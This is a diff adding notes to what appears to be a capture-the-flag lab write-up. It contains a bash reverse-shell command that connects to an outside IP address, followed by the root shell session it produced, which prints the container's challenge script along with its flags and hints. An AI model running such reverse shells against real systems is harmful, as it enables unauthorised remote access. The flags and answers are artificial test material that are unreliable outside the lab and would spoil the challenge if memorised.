@@ -299,3 +299,241 @@ drwxr-xr-x   1 root root 4096 Apr  6 00:00 usr
 drwxr-xr-x   1 root root 4096 Apr  6 00:00 var
 stderr=
 ```
+
+reverse shell to remote exec containier
+- bash -i >& /dev/tcp/80.90.100.10/8888 0>&1
+```
+root@0521ead29eb7:/app# ls -la
+ls -la
+total 16
+drwxr-xr-x 1 root root 4096 Apr  7 14:45 .
+drwxr-xr-x 1 root root 4096 Jun  3 03:42 ..
+-rw-rw-r-- 1 root root 7478 Apr  6 19:59 exec_agent.py
+root@0521ead29eb7:/app# cat exec_agent.py
+cat exec_agent.py
+import json
+import os
+import shutil
+import subprocess
+import time
+import gzip
+from pathlib import Path
+
+
+DROPBOX_ROOT = Path(os.getenv("EXEC_DROPBOX_ROOT", "/var/run/exec-dropbox"))
+UPLOADS_DIR = DROPBOX_ROOT / "uploads"
+REQUESTS_DIR = DROPBOX_ROOT / "requests"
+RESPONSES_DIR = DROPBOX_ROOT / "responses"
+
+BRIDGE_ROOT = Path(os.getenv("BRIDGE_ROOT", "/var/run/node-agent"))
+BRIDGE_REQ_DIR = BRIDGE_ROOT / "requests"
+BRIDGE_RESP_DIR = BRIDGE_ROOT / "responses"
+
+MOUNTED_PATH_FLAG = os.getenv("MOUNTED_PATH_FLAG", "CS{OPS-CONTAINER-MOUNT-3.1}")
+LIMITED_TOOLING_FLAG = os.getenv("LIMITED_TOOLING_FLAG", "CS{OPS-CONTAINER-TOOLS-3.1}")
+MISCONFIG_SCOPE_FLAG = os.getenv("MISCONFIG_SCOPE_FLAG", "CS{OPS-CONTAINER-MISCONFIG-3.1}")
+SSH_ARTIFACT_ROOT = os.getenv("SSH_ARTIFACT_ROOT", "/opt/ops/ssh-materials")
+MAN_OBJECTIVE_DIR = Path(os.getenv("MAN_OBJECTIVE_DIR", "/usr/share/man/man7"))
+MAN_OBJECTIVE_PAGE = os.getenv("MAN_OBJECTIVE_PAGE", "ops-runtime.7.gz")
+MAN_OBJECTIVE_TOKEN = os.getenv("MAN_OBJECTIVE_TOKEN", "runtime-manproof")
+MAN_HELPER_PATH = Path(os.getenv("MAN_HELPER_PATH", "/opt/ops/tools/check-man-evidence"))
+
+
+def ensure_layout() -> None:
+    for path in (
+        UPLOADS_DIR,
+        REQUESTS_DIR,
+        RESPONSES_DIR,
+        BRIDGE_REQ_DIR,
+        BRIDGE_RESP_DIR,
+        Path(SSH_ARTIFACT_ROOT),
+        MAN_OBJECTIVE_DIR,
+        MAN_HELPER_PATH.parent,
+    ):
+        path.mkdir(parents=True, exist_ok=True)
+
+    readme = BRIDGE_ROOT / "README.txt"
+    readme.write_text(
+        "Drop requests into ./requests as <name>.job.\n"
+        "Agent writes output to ./responses/<name>.out.\n"
+        "\n"
+        "Supported request strings:\n"
+        "- status\n"
+        "- list-scopes\n",
+        encoding="utf-8",
+    )
+
+    objective = Path("/opt/ops/objectives.txt")
+    objective.write_text(
+        "Container role: exec\n"
+        "mounted_path_flag={}\n"
+        "limited_tooling_objective=missing-man-alt-method\n"
+        "misconfig_scope_flag={}\n"
+        "ssh_artifacts={}\n".format(
+            MOUNTED_PATH_FLAG,
+            MISCONFIG_SCOPE_FLAG,
+            SSH_ARTIFACT_ROOT,
+        ),
+        encoding="utf-8",
+    )
+
+    man_page_content = (
+        ".TH OPS-RUNTIME 7\n"
+        ".SH NAME\n"
+        "ops-runtime \\- runtime operations reference\n"
+        ".SH DESCRIPTION\n"
+        "This environment intentionally omits the man command.\n"
+        "Collect evidence from manpage source artifacts with alternate tooling.\n"
+        ".SH VALIDATION\n"
+        "token={}\n".format(MAN_OBJECTIVE_TOKEN)
+    )
+    with gzip.open(MAN_OBJECTIVE_DIR / MAN_OBJECTIVE_PAGE, "wt", encoding="utf-8") as handle:
+        handle.write(man_page_content)
+
+    MAN_HELPER_PATH.write_text(
+        "#!/bin/sh\n"
+        "set -eu\n"
+        "if [ -z \"${{1:-}}\" ]; then\n"
+        "  echo \"usage: check-man-evidence <token>\"\n"
+        "  exit 2\n"
+        "fi\n"
+        "if [ \"$1\" = \"{}\" ]; then\n"
+        "  echo \"limited_tooling_flag={}\"\n"
+        "  exit 0\n"
+        "fi\n"
+        "echo \"result=invalid-token\"\n"
+        "exit 1\n".format(MAN_OBJECTIVE_TOKEN, LIMITED_TOOLING_FLAG),
+        encoding="utf-8",
+    )
+    MAN_HELPER_PATH.chmod(0o755)
+
+
+def run_remote_job(job_path: Path) -> None:
+    response_path = RESPONSES_DIR / f"{job_path.stem}.out"
+    try:
+        data = json.loads(job_path.read_text(encoding="utf-8"))
+    except json.JSONDecodeError:
+        response_path.write_text("error=invalid-job-json\n", encoding="utf-8")
+        job_path.unlink(missing_ok=True)
+        return
+
+    target_name = Path(str(data.get("file", ""))).name
+    args = str(data.get("args", "")).strip()
+    if not target_name:
+        response_path.write_text("error=missing-file\n", encoding="utf-8")
+        job_path.unlink(missing_ok=True)
+        return
+
+    target = UPLOADS_DIR / target_name
+    if not target.exists():
+        response_path.write_text(f"error=file-not-found:{target_name}\n", encoding="utf-8")
+        job_path.unlink(missing_ok=True)
+        return
+
+    target.chmod(0o755)
+    cmd = [str(target)]
+    if args:
+        cmd.extend(args.split())
+
+    try:
+        result = subprocess.run(
+            cmd,
+            capture_output=True,
+            text=True,
+            timeout=12,
+            check=False,
+        )
+        stdout = result.stdout.strip()
+        stderr = result.stderr.strip()
+        body = (
+            f"source=exec-container\n"
+            f"exit_code={result.returncode}\n"
+            f"mounted_path_hint=/srv/archive/reports/maintenance-readme.txt\n"
+            f"limited_tooling_hint=extract-token-from-man-source\n"
+            f"man_source={MAN_OBJECTIVE_DIR / MAN_OBJECTIVE_PAGE}\n"
+            f"man_validator={MAN_HELPER_PATH}\n"
+            f"ssh_artifacts={SSH_ARTIFACT_ROOT}\n"
+            f"stdout={stdout}\n"
+            f"stderr={stderr}\n"
+        )
+        response_path.write_text(body, encoding="utf-8")
+    except Exception as exc:  # pragma: no cover
+        response_path.write_text(f"error=exec-failed:{exc}\n", encoding="utf-8")
+    finally:
+        job_path.unlink(missing_ok=True)
+
+
+def process_bridge_job(job_path: Path) -> None:
+    request = job_path.read_text(encoding="utf-8", errors="ignore").strip()
+    response_path = BRIDGE_RESP_DIR / f"{job_path.stem}.out"
+    if request == "status":
+        response = (
+            "agent=maintenance-scope-proxy\n"
+            "scope=container-exec-support\n"
+            f"misconfig_scope_flag={MISCONFIG_SCOPE_FLAG}\n"
+        )
+    elif request == "list-scopes":
+        response = "allowed=status,list-scopes\n"
+    else:
+        response = "error=unsupported-request\n"
+    response_path.write_text(response, encoding="utf-8")
+    job_path.unlink(missing_ok=True)
+
+
+def hide_ssh_client() -> None:
+    # Keep SSH artifacts present but ensure there is no native ssh client.
+    for candidate in ("/usr/bin/ssh", "/bin/ssh", "/usr/local/bin/ssh"):
+        path = Path(candidate)
+        if path.exists():
+            try:
+                path.unlink()
+            except OSError:
+                pass
+
+
+def disable_man_command() -> None:
+    man_path = shutil.which("man")
+    if not man_path:
+        return
+    man_binary = Path(man_path)
+    disabled_target = man_binary.with_name(f"{man_binary.name}.disabled")
+    if disabled_target.exists():
+        return
+    try:
+        man_binary.rename(disabled_target)
+    except OSError:
+        # Non-fatal in constrained images; objective still works if man is already absent.
+        return
+
+
+def write_runtime_hints() -> None:
+    tooling_note = Path("/opt/ops/tooling-note.txt")
+    missing = [name for name in ("ssh", "nc", "netstat", "ss", "ip") if shutil.which(name) is None]
+    if shutil.which("man") is None:
+        missing.append("man")
+    tooling_note.write_text(
+        "limited tooling observed: {}\n"
+        "objective_hint=man command missing; inspect manpage source directly\n"
+        "man_source={}\n"
+        "validator={}\n".format(",".join(missing), MAN_OBJECTIVE_DIR / MAN_OBJECTIVE_PAGE, MAN_HELPER_PATH),
+        encoding="utf-8",
+    )
+
+
+def main() -> None:
+    ensure_layout()
+    hide_ssh_client()
+    disable_man_command()
+    write_runtime_hints()
+    while True:
+        for remote_job in sorted(REQUESTS_DIR.glob("*.job")):
+            run_remote_job(remote_job)
+        for bridge_job in sorted(BRIDGE_REQ_DIR.glob("*.job")):
+            process_bridge_job(bridge_job)
+        time.sleep(1)
+
+
+if __name__ == "__main__":
+    main()
+
+```
